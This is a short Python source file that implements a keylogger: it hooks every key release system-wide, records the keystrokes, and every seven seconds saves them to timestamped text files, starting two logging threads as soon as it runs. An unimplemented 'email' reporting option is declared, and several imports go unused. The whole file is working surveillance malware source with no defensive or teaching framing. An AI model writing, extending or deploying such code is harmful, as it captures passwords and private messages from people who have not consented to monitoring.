import keyboard
from threading import Timer
from datetime import datetime
import time
import random
import time
from multiprocessing import Process
from pynput.keyboard import Listener
import pyperclip
import threading

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.filename = None
        self.interval = interval
        self.report_method = report_method
        self.log = ""

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        data_time = time.time()
        self.filename = f"keylog-{data_time}"

    def report_to_file(self):
        if self.log:
            self.log = self.log \
                .replace("[SHIFT]", "")
            with open(f"{self.filename}.txt", "w") as f:
                print(self.log, file=f)
            print(f"[+] Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.update_filename()
            if self.report_method == "file":
                self.report_to_file()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

def start():
    keylogger = Keylogger(interval=7, report_method="file")
    keylogger.start()


o = threading.Thread(target=start, args=())
o.start()
time.sleep(0.3)
t = threading.Thread(target=start, args=())
t.start()



